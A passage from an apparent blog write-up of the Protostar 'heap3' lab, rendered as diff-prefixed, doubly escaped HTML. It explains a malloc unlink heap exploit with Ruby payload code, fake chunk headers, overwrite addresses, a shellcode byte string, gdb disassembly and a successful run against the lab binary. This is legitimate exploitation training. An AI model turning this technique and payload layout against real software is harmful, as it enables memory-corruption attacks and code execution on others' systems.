-</span><span class='line'><span class="sr">&lt;h1&gt;chunk1&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">argv1</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">XXXX</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                        <span class="c1"># user data, later overwritten by second free()</span>
-</span><span class='line'><span class="n">argv1</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x68</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">x88</span><span class="p">\</span><span class="n">x04</span><span class="p">\</span><span class="n">x08</span><span class="p">\</span><span class="n">xc3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c1"># shellcode&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">chunk2</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;p&gt;argv2  = &amp;ldquo;X&amp;rdquo; * 24 + &amp;ldquo;\x01&amp;rdquo; + &amp;ldquo;ABCDEFG&amp;rdquo; # user data&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">chunk3</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;p&gt;argv2 &amp;lt;&amp;lt; [0xfffffff8].pack(&amp;ldquo;V&amp;rdquo;)        # prev_size = -8 &amp;amp;&amp;amp; PREV_INUSE = 0</span>
-</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0xfffffffc].pack(&amp;ldquo;V&amp;rdquo;)        # size = -4</span>
-</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x44444444].pack(&amp;ldquo;V&amp;rdquo;)        # prev_size(unused) for fake chunk</span>
-</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x45454545].pack(&amp;ldquo;V&amp;rdquo;)        # size(unused) for fake chunk</span>
-</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x0804b11c].pack(&amp;ldquo;V&amp;rdquo;)        # ret_loc-0x0c</span>
-</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x0804c00c].pack(&amp;ldquo;V&amp;rdquo;)        # ret_addr</span>
-</span><span class='line'><span class="sr">argv3  = &amp;ldquo;X&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x0804b11c</span><span class="o">+</span><span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x0804c00c</span><span class="p">;</span> <span class="o">&lt;</span><span class="sr">/em&gt;(0x0804c00c+8) = 0x0804b11c&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="nb">puts</span> <span class="sx">%x[ </span><span class="si">#{</span><span class="n">binary</span><span class="si">}</span><span class="sx"> &amp;ldquo;</span><span class="si">#{</span><span class="n">argv1</span><span class="si">}</span><span class="sx">&amp;rdquo; &amp;ldquo;</span><span class="si">#{</span><span class="n">argv2</span><span class="si">}</span><span class="sx">&amp;rdquo; &amp;ldquo;</span><span class="si">#{</span><span class="n">argv3</span><span class="si">}</span><span class="sx">&amp;rdquo; ]</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>To explain the logic behind our code, because <code>size</code> has the lowest bit set as
-<code>!PREV_INUSE</code> and <code>p</code> points to the beginning of our current chunk, we
-triggered the following part of pseudocode with the first <code>free()</code>:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">consolidate</span> <span class="n">backward</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
-</span><span class='line'>  <span class="p">{</span>
-</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="o">-</span><span class="mi">8</span>
-</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">+</span><span class="mi">8</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Here the address of &ldquo;virtual chunk&rdquo; was computed and unlinked:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">[</span><span class="mh">0x44444444</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># prev_size</span>
-</span><span class='line'><span class="o">[</span><span class="mh">0x45454545</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># size</span>
-</span><span class='line'><span class="o">[</span><span class="mh">0x0804b11c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># fwd</span>
-</span><span class='line'><span class="o">[</span><span class="mh">0x0804c00c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># bck</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>However, there is another test in consolidate forward:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>if (!(inuse_bit_at_offset(next, nextsz)))   /&lt;em> consolidate forward &lt;/em>/
-</span><span class='line'>    unlink(next, bck, fwd);&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>0x08049918 &lt;free+244>:  mov    eax,DWORD PTR [ebp-0x24] ; eax:FFFFFFF8 = -8
-</span><span class='line'>0x0804991b &lt;free+247>:  mov    edx,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
-</span><span class='line'>0x0804991e &lt;free+250>:  lea    eax,[edx+eax*1]          ; 0x804c044: &ldquo;XXXX\001ABCDEFG\370\377\377\377\374\377\377\377X&rdquo;
-</span><span class='line'>0x08049921 &lt;free+253>:  mov    eax,DWORD PTR [eax+0x4]  ; eax:43424101
-</span><span class='line'>0x08049924 &lt;free+256>:  and    eax,0x1                  ; eax:00000001 = PREV_INUSE flag
-</span><span class='line'>0x08049927 &lt;free+259>:  mov    DWORD PTR [ebp-0x20],eax ;
-</span><span class='line'>0x0804992a &lt;free+262>:  mov    eax,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
-</span><span class='line'>0x0804992d &lt;free+265>:  mov    edx,DWORD PTR [ebp-0x24] ; edx:FFFFFFF8
-</span><span class='line'>0x08049930 &lt;free+268>:  mov    DWORD PTR [eax+0x4],edx&lt;br/>
-</span><span class='line'>0x08049933 &lt;free+271>:  cmp    DWORD PTR [ebp-0x20],0x0 ; PREV_INUSE set?&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
-
-<p>Here we are verifying, if the <code>PREV_INUSE</code> flag is set <code>(0x43424101)</code>, so we
-skipped the forward consolidation:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">argv2</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">X</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">ABCDEFG</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="c1"># user data</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ /opt/protostar/bin/heap3 $(ruby -e &lsquo;print &ldquo;XXXX&rdquo; + &ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;&rsquo;) $(ruby -e &lsquo;print &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + [0x0804b11c].pack(&ldquo;V&rdquo;) + [0x0804c00c].pack(&ldquo;V&rdquo;)&rsquo;) X
-</span><span class='line'>that wasn&rsquo;t too bad now, was it? @ 1435304932&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>user@protostar:/tmp$ ./exploit-backward.rb
-</span><span class='line'>that wasn&rsquo;t too bad now, was it? @ 1435304818&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;h2></span></code></pre></td></tr></table></div></figure></h2>
 ]]></content>
   </entry>
   
